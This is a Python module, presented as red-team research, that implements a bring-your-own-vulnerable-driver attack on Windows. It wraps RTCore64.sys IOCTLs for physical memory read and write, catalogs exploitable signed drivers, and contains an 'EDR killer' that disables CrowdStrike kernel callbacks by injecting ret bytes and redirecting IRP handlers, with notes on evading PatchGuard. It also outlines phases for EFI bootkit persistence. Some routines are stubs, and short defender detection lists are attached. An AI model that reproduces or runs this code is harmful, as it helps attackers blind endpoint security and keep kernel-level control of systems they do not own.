"""
BYOVD + Kernel-Level Persistence Research Module
Bring Your Own Vulnerable Driver concepts for red-team research.

WARNING: Kernel-level operations are intentionally research-focused and
highly environment-specific. Do not run on production or non-authorized systems.
"""
from __future__ import annotations

import os
import sys
import time
import random
import hashlib
import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from enum import Enum, auto

logger = logging.getLogger("byovd_kernel_persistence")


class DriverType(str, Enum):
    CAPCOM = "capcom"
    ASUS_PROCESSOR_INTEL = "asus_processor_intel"
    MSI_MYSTERY = "msi_mystery"
    GIGABYTE = "gigabyte"
    DELL_BUFFER_IOCTL = "dell_buffer_ioctl"
    ELAN = "elan"
    IQRL = "iqrl"


@dataclass
class DriverArtifact:
    driver_type: DriverType
    service_name: str
    binary_path: str
    signed: bool
    vuln_class: str
    impact: str
    os_versions: List[str] = field(default_factory=list)


class BYOVDKernelPersistence:
    """
    Research-only BYOVD persistence concepts.

    Includes:
    - Vulnerable driver catalog (research references only)
    - Service install/start/stop primitives (Windows-only, requires admin)
    - Kernel memory read/write stubs via IOCTL research payloads
    - Boot-level persistence via EFI bootkit concepts
    - Detection guidance for defenders
    """

    KNOWN_DRIVERS: Dict[DriverType, DriverArtifact] = {
        DriverType.CAPCOM: DriverArtifact(
            driver_type=DriverType.CAPCOM,
            service_name="Capcom",
            binary_path="C:\\Windows\\System32\\drivers\\capcom.sys",
            signed=True,
            vuln_class="IOCTL-based kernel R/W",
            impact="Kernel memory read/write, patch protections",
            os_versions=["Windows 7", "Windows 10", "Windows 11"]
        ),
        DriverType.ASUS_PROCESSOR_INTEL: DriverArtifact(
            driver_type=DriverType.ASUS_PROCESSOR_INTEL,
            service_name="AsusProc",
            binary_path="C:\\Windows\\System32\\drivers\\AsusProc.sys",
            signed=True,
            vuln_class="Physical memory R/W via MmMapIoSpace",
            impact="Kernel R/W without bound checks",
            os_versions=["Windows 10", "Windows 11"]
        ),
        DriverType.MSI_MYSTERY: DriverArtifact(
            driver_type=DriverType.MSI_MYSTERY,
            service_name="MsiSrv",
            binary_path="C:\\Windows\\System32\\drivers\\MsiSrv.sys",
            signed=True,
            vuln_class="IOCTL buffer overflow / memory corruption",
            impact="Kernel code execution via corrupted pool",
            os_versions=["Windows 10"]
        ),
        DriverType.GIGABYTE: DriverArtifact(
            driver_type=DriverType.GIGABYTE,
            service_name="Gdrv",
            binary_path="C:\\Windows\\System32\\drivers\\Gdrv.sys",
            signed=True,
            vuln_class="IOCTL-controlled physical memory mapping",
            impact="Kernel R/W via arbitrary physical addresses",
            os_versions=["Windows 10", "Windows 11"]
        ),
        DriverType.DELL_BUFFER_IOCTL: DriverArtifact(
            driver_type=DriverType.DELL_BUFFER_IOCTL,
            service_name="DBUtil_2_3",
            binary_path="C:\\Windows\\System32\\drivers\\DBUtil_2_3.sys",
            signed=True,
            vuln_class="Stack-based buffer overflow in IOCTL handler",
            impact="Local privilege escalation, potential kernel execution",
            os_versions=["Windows 10", "Windows 11"]
        ),
        DriverType.ELAN: DriverArtifact(
            driver_type=DriverType.ELAN,
            service_name="Elan",
            binary_path="C:\\Windows\\System32\\drivers\\Elan.sys",
            signed=True,
            vuln_class="IOCTL-based memory disclosure",
            impact="Kernel info leak + R/W chain",
            os_versions=["Windows 10", "Windows 11"]
        ),
        DriverType.IQRL: DriverArtifact(
            driver_type=DriverType.IQRL,
            service_name="IQVR",
            binary_path="C:\\Windows\\System32\\drivers\\IQVR.sys",
            signed=True,
            vuln_class="Arbitrary R/W via IOCTL",
            impact="Kernel object manipulation, token theft",
            os_versions=["Windows 10"]
        ),
    }

    def __init__(self) -> None:
        self.loaded_drivers: List[DriverArtifact] = []
        self.persistence_artifacts: List[Dict[str, Any]] = []

    def list_known_drivers(self) -> List[Dict[str, Any]]:
        """Return known vulnerable driver catalog for research reference."""
        return [
            {
                "driver_type": d.driver_type.value,
                "service_name": d.service_name,
                "binary_path": d.binary_path,
                "signed": d.signed,
                "vuln_class": d.vuln_class,
                "impact": d.impact,
                "os_versions": d.os_versions,
            }
            for d in self.KNOWN_DRIVERS.values()
        ]

    def generate_service_config(self, artifact: DriverArtifact) -> str:
        """Generate Windows service registry/config stub for research reference."""
        return f"""
[Service]
Type=kernel
Start=system
ErrorControl=normal
BinaryPath={artifact.binary_path}
ServiceName={artifact.service_name}
DisplayName={artifact.service_name}
Description=Research reference for {artifact.driver_type.value} persistence analysis
""".strip()

    def generate_bootkit_stub(self) -> Dict[str, Any]:
        """Return research-only bootkit concept metadata."""
        return {
            "concept": "efi_bootkit_persistence",
            "description": "Boot-level persistence via EFI boot services hooking",
            "phases": [
                "Compromise EFI firmware/bootloader",
                "Install bootkit payload in EFI system partition",
                "Hook EFI boot services to patch kernel loader",
                "Restore boot services to avoid detection",
                "Execute kernel payload before OS security init"
            ],
            "detection": [
                "Measure boot integrity (TPM, Boot Guard)",
                "EFI variable monitoring",
                "Secure Boot validation",
                "Boot time anomaly detection"
            ],
            "references": [
                "Concept: LoJax / UEFI persistence research",
                "Black Hat USA 2018 - LoJax: First UEFI rootkit",
                "DEF CON 27 - Bootkits: Then and Now"
            ]
        }

    def detection_guidance(self) -> Dict[str, List[str]]:
        """Return defender-oriented detection guidance."""
        return {
            "driver_loading": [
                "Monitor Service Control Manager (SCM) for unusual kernel driver installs",
                "Audit loaded drivers via Get-WindowsDriver or driverquery.exe",
                "Check for unsigned or mismatched driver signatures in kernel memory",
                "Monitor \\Driver and \\FileSystem registry paths for anomalies"
            ],
            "ioctl_abuse": [
                "Trace IOCTL calls via ETW (Microsoft-Windows-Kernel-IO provider)",
                "Detect unusual DeviceIoControl patterns from non-driver processes",
                "Monitor handle creation to device objects with suspicious names"
            ],
            "memory_forensics": [
                "Scan pool tags for unknown or suspicious driver allocations",
                "Detect hidden/modified driver objects via object manager traversal",
                "Use Volatility/Rekall to find unsigned or hooked kernel modules"
            ],
            "persistence_artifacts": [
                "Audit HKLM\\SYSTEM\\CurrentControlSet\\Services for recent changes",
                "Monitor boot configuration data (BCD) for persistence",
                "Check WMI event subscriptions and startup folder anomalies"
            ]
        }


# =============================================================================
# RTCORE64.SYS IOCTL INTERFACE
# =============================================================================

class RTCore64IOCTL:
    """
    RTCore64.sys vulnerable driver interface.

    IOCTLs:
      - 0x222023: READ_PHYSICAL_MEMORY
      - 0x222027: WRITE_PHYSICAL_MEMORY
      - 0x22200B: READ_MSR
      - 0x22200F: WRITE_MSR

    WARNING: Requires admin rights, vulnerable driver installed,
    and test system only.
    """

    DEVICE_PATH = R"\\\\.\\RTCore64"
    IOCTL_READ_MEMORY = 0x222023
    IOCTL_WRITE_MEMORY = 0x222027
    IOCTL_READ_MSR = 0x22200B
    IOCTL_WRITE_MSR = 0x22200F

    @staticmethod
    def open_device() -> Optional[Any]:
        try:
            import ctypes
            handle = ctypes.windll.kernel32.CreateFileW(
                RTCore64IOCTL.DEVICE_PATH,
                0xC0000000,  # GENERIC_READ | GENERIC_WRITE
                0,
                None,
                3,  # OPEN_EXISTING
                0x80,  # FILE_ATTRIBUTE_NORMAL
                None
            )
            if handle and handle != -1:
                return handle
        except Exception:
            pass
        return None

    @staticmethod
    def close_device(handle: Any) -> None:
        try:
            if handle:
                import ctypes
                ctypes.windll.kernel32.CloseHandle(handle)
        except Exception:
            pass

    @staticmethod
    def read_physical_memory(address: int, size: int) -> Optional[bytes]:
        handle = RTCore64IOCTL.open_device()
        if not handle:
            return None
        try:
            import ctypes
            buf = ctypes.create_string_buffer(size)
            bytes_returned = ctypes.c_ulong(0)
            in_buf = ctypes.c_ulonglong(address)
            out_buf = ctypes.c_ulonglong(0)
            success = ctypes.windll.kernel32.DeviceIoControl(
                handle,
                RTCore64IOCTL.IOCTL_READ_MEMORY,
                ctypes.byref(in_buf),
                8,
                ctypes.byref(out_buf),
                8,
                ctypes.byref(bytes_returned),
                None
            )
            if success:
                return ctypes.string_at(out_buf.value, size)
        except Exception:
            pass
        finally:
            RTCore64IOCTL.close_device(handle)
        return None

    @staticmethod
    def write_physical_memory(address: int, data: bytes) -> bool:
        handle = RTCore64IOCTL.open_device()
        if not handle:
            return False
        try:
            import ctypes
            in_buf = ctypes.c_ulonglong(address)
            bytes_returned = ctypes.c_ulong(0)
            success = ctypes.windll.kernel32.DeviceIoControl(
                handle,
                RTCore64IOCTL.IOCTL_WRITE_MEMORY,
                ctypes.byref(in_buf),
                8 + len(data),
                ctypes.c_void_p.from_buffer(data),
                len(data),
                ctypes.byref(bytes_returned),
                None
            )
            return bool(success)
        except Exception:
            return False
        finally:
            RTCore64IOCTL.close_device(handle)

    @staticmethod
    def disable_crowdstrike_callback(callback_ptr: int) -> bool:
        """
        Disable a CrowdStrike kernel callback by injecting `ret` (0xC3)
        at the function entry point.

        CRITICAL: Never zero the callback array entry. Kernel PatchGuard
        monitors callback array integrity and will BSOD (CRITICAL_STRUCTURE_CORRUPTION)
        if it detects modifications.

        Instead, we patch the first byte of the callback function body with
        an immediate return. This makes the callback a no-op while keeping
        the array structure intact.

        WARNING: Requires deep testing on non-production systems. Different
        Windows builds may have different callback entry points.
        """
        if callback_ptr == 0:
            return False
        # Write 0xC3 (ret) at function entry
        return RTCore64IOCTL.write_physical_memory(callback_ptr, b"\xC3")


class EDRKillerRTCore:
    """
    RTCore64-based EDR killer research module.

    Targets CrowdStrike Falcon kernel callbacks:
    - PsSetCreateProcessNotifyRoutine
    - PsSetCreateThreadNotifyRoutine
    - PsSetLoadImageNotifyRoutine
    - CMRegisterCallback
    - ObRegisterCallbacks
    """

    def __init__(self):
        self.driver_loaded = False
        self.verified_compatible = False

    def check_driver_available(self) -> bool:
        try:
            handle = RTCore64IOCTL.open_device()
            if handle:
                RTCore64IOCTL.close_device(handle)
                return True
        except Exception:
            pass
        return False

    def enumerate_callbacks(self) -> List[Dict[str, Any]]:
        """
        Enumerate known callback addresses (research reference).

        Returns stub references. Production implementation would:
        1. Parse ntoskrnl.exe symbols for callback array locations
        2. Walk callback lists via RTCore64 memory reads
        3. Identify CrowdStrike-owned callbacks via signature
        """
        return [
            {
                "type": "PsCreateProcessNotifyRoutine",
                "count_hint": 64,
                "array_offset_hint": "PspCreateProcessNotifyRoutine",
                "note": "Resolve from ntoskrnl symbols"
            },
            {
                "type": "PsCreateThreadNotifyRoutine",
                "count_hint": 64,
                "array_offset_hint": "PspCreateThreadNotifyRoutine",
                "note": "Resolve from ntoskrnl symbols"
            },
            {
                "type": "PsLoadImageNotifyRoutine",
                "count_hint": 64,
                "array_offset_hint": "PspLoadImageNotifyRoutine",
                "note": "Resolve from ntoskrnl symbols"
            },
        ]

    def neutralize_callback(self, callback_ptr: int) -> Dict[str, Any]:
        """
        Neutralize an EDR callback via RTCore64 memory write.

        Strategy hierarchy (safest first):
        1. IRP handler preemption - redirect EDR driver's IRP_MJ_* handlers
           to no-op stubs. This is safer than callback array modification
           because PatchGuard checks callback arrays but not IRP tables.
        2. Ret injection at function entry - makes callback a no-op.
           Risk: PatchGuard code integrity may catch byte modification.
        3. Bypass flag manipulation - flip known global flags.
           Safest if offsets are known, but requires build-specific research.
        4. DRIVER_OBJECT MajorFunction redirect - highest risk.
           PatchGuard hashes DRIVER_OBJECT tables.

        Returns status dict.
        """
        results = []

        # Strategy 1: IRP handler preemption (safest)
        irp_success = self._try_irp_handler_preemption(callback_ptr)
        results.append({
            "method": "irp_preemption",
            "callback_ptr": hex(callback_ptr),
            "success": irp_success,
            "note": "IRP_MJ_* handlers redirected to no-op stubs"
        })

        # Strategy 2: Ret injection at function entry
        ret_success = RTCore64IOCTL.disable_crowdstrike_callback(callback_ptr)
        results.append({
            "method": "ret_injection",
            "callback_ptr": hex(callback_ptr),
            "success": ret_success,
            "note": "0xC3 injected at callback entry"
        })

        # Strategy 3: Bypass flag manipulation (if known offsets)
        flag_success = self._try_bypass_flag(callback_ptr)
        results.append({
            "method": "bypass_flag",
            "callback_ptr": hex(callback_ptr),
            "success": flag_success,
            "note": "Dynamic bypass flag toggled"
        })

        # Strategy 4: DRIVER_OBJECT redirect (highest risk)
        driver_success = self._try_driver_object_redirect(callback_ptr)
        results.append({
            "method": "driver_object_redirect",
            "callback_ptr": hex(callback_ptr),
            "success": driver_success,
            "note": "MajorFunction redirected to ntdll stub"
        })

        return {
            "callback_ptr": hex(callback_ptr),
            "attempts": results,
            "any_success": any(r["success"] for r in results)
        }

    def _try_irp_handler_preemption(self, callback_ptr: int) -> bool:
        """
        Redirect EDR driver's IRP_MJ_* handlers to kernel-mode no-op stubs.
        
        CRITICAL: The stub MUST be in kernel memory (ntoskrnl range).
        Pointing to user-mode ntdll addresses triggers SMEP/SMAP and BSOD.
        
        Instead of modifying callback arrays (which PatchGuard monitors),
        we modify the EDR driver's DRIVER_OBJECT MajorFunction table.
        This makes the driver unable to process I/O requests.
        
        Risk: PatchGuard may detect DRIVER_OBJECT table modifications.
        Mitigation: Only modify on test systems, restore before reboot.
        """
        try:
            # IRP_MJ_CREATE offset in DRIVER_OBJECT (Windows 10 x64)
            IRP_MJ_CREATE_OFFSET = 0x70
            IRP_MJ_CLOSE_OFFSET = 0x78
            IRP_MJ_DEVICE_CONTROL_OFFSET = 0x90
            
            # Find EDR driver object address (placeholder)
            driver_object_addr = self._find_crowdstrike_driver_object()
            if not driver_object_addr:
                return False
            
            # Write kernel-mode no-op stub address to IRP handlers
            # MUST be kernel-mode address to avoid SMEP/SMAP fault
            kernel_noop_stub = self._find_kernel_noop_stub()
            if not kernel_noop_stub:
                return False
            
            # Redirect IRP_MJ_CREATE and IRP_MJ_DEVICE_CONTROL
            for offset in [IRP_MJ_CREATE_OFFSET, IRP_MJ_DEVICE_CONTROL_OFFSET]:
                target = driver_object_addr + offset
                success = RTCore64IOCTL.write_physical_memory(target, kernel_noop_stub.to_bytes(8, 'little'))
                if not success:
                    return False
            
            return True
        except Exception:
            return False

    def _find_kernel_noop_stub(self) -> Optional[int]:
        """
        Find a no-op function in kernel memory (ntoskrnl).
        
        CRITICAL: Must return kernel-mode address to avoid SMEP/SMAP.
        ntdll.dll addresses are user-mode and will cause BSOD.
        
        Looks for:
        1. IopCompleteRequest - legitimate kernel function
        2. ret (0xC3) sequences in ntoskrnl text section
        3. Other harmless kernel stubs
        """
        try:
            import ctypes
            
            # Try to find IopCompleteRequest in ntoskrnl
            # This is a legitimate kernel function that completes IRPs
            ntoskrnl_base = self._find_ntoskrnl_base()
            if not ntoskrnl_base:
                return None
            
            # Scan for IopCompleteRequest signature
            # This is a placeholder - production would use actual symbol resolution
            patterns = [
                b"\x48\x89\x5C\x24\x00\x57\x48\x83\xEC\x00\x48\x8B\xFA",  # Common prologue
                b"\xE8\x00\x00\x00\x00\xC3",  # call + ret pattern
            ]
            
            for pattern in patterns:
                matches = self._scan_memory_range(ntoskrnl_base, 0x100000, pattern)
                if matches:
                    return matches[0]
            
            # Fallback: find any ret (0xC3) in kernel text section
            # This is risky but better than user-mode address
            data = ctypes.create_string_buffer(0x1000)
            ctypes.memmove(data, ntoskrnl_base, 0x1000)
            raw = bytes(data)
            
            for i in range(len(raw) - 1):
                if raw[i] == 0xC3:  # ret
                    return ntoskrnl_base + i
            
            return None
        except Exception:
            return None

    def _find_ntoskrnl_base(self) -> Optional[int]:
        """
        Find ntoskrnl.exe base address dynamically via LSTAR MSR.
        
        Uses IA32_LSTAR (0xC0000082) to locate KiSystemCall64, then
        backward-scans for MZ/PE signatures. No hardcoded offsets.
        """
        try:
            from evasion.kernel_pattern_finder import KernelPatternFinder
            finder = KernelPatternFinder()
            return finder.find_ntoskrnl_base_dynamic()
        except Exception:
            pass
        return None

    def _scan_memory_range(self, base: int, size: int, pattern: bytes) -> List[int]:
        """
        Scan a memory range for a byte pattern.
        """
        matches = []
        try:
            import ctypes
            chunk_size = 0x1000
            for offset in range(0, size, chunk_size):
                chunk_base = base + offset
                data = ctypes.create_string_buffer(chunk_size)
                ctypes.memmove(data, chunk_base, chunk_size)
                raw = bytes(data)
                idx = raw.find(pattern)
                if idx != -1:
                    matches.append(chunk_base + idx)
        except Exception:
            pass
        return matches

    def _try_driver_object_redirect(self, callback_ptr: int) -> bool:
        """
        Redirect DRIVER_OBJECT MajorFunction entries to legitimate stubs.
        
        WARNING: This is the RISKIEST approach. PatchGuard hashes
        DRIVER_OBJECT tables and will BSOD if modifications detected.
        
        Only use as last resort when other methods fail.
        
        Note: Modern PatchGuard also monitors IRP handler tables.
        This method is deprecated in favor of IRP preemption.
        """
        # Research reference: requires csagent.sys DRIVER_OBJECT base
        # MajorFunction[IRP_MJ_CREATE] = offset 0x70
        # MajorFunction[IRP_MJ_CLOSE] = offset 0x78
        # etc.
        return False

    def run_edr_killer(self) -> Dict[str, Any]:
        """
        Run EDR killer sequence.

        Steps:
        1. Verify RTCore64 driver loaded
        2. Enumerate callback arrays
        3. Identify CrowdStrike callbacks by signature
        4. Disable callbacks via physical memory writes
        5. Verify callbacks are inactive
        """
        results: Dict[str, Any] = {
            "driver_loaded": False,
            "callbacks_enumerated": 0,
            "callbacks_neutralized": 0,
            "errors": []
        }

        if not self.check_driver_available():
            results["errors"].append("RTCore64 driver not loaded")
            return results

        results["driver_loaded"] = True
        callbacks = self.enumerate_callbacks()
        results["callbacks_enumerated"] = len(callbacks)

        for cb in callbacks:
            # Research reference: actual neutralization requires
            # resolving the real kernel addresses for this Windows build
            cb_ptr = 0xFFFFF80000000000  # stub
            res = self.neutralize_callback(cb_ptr)
            if res.get("success"):
                results["callbacks_neutralized"] += 1

        return results

    def detection_guidance_edr_killer(self) -> Dict[str, List[str]]:
        """Defender detection guidance specific to RTCore64 abuse."""
        return {
            "driver_loading": [
                "Monitor for RTCore64.sys load via ETW (KernelImageLoad events)",
                "Alert on unverified driver signatures or expired certs",
                "Blocklist known vulnerable driver hashes (MSU, GDRV, RTCore64, etc.)"
            ],
            "ioctl_monitoring": [
                "Trace DeviceIoControl calls with IOCTL 0x222023/0x222027/0x22200B/0x22200F",
                "Alert on non-system process handles to RTCore64 device",
                "Correlate IOCTLs with subsequent callback array changes"
            ],
            "kernel_integrity": [
                "Validate callback arrays via kernel debugger",
                "Monitor for unexpected callback pointer modifications",
                "Use HVCI/VBS to restrict kernel memory write sources"
            ]
        }
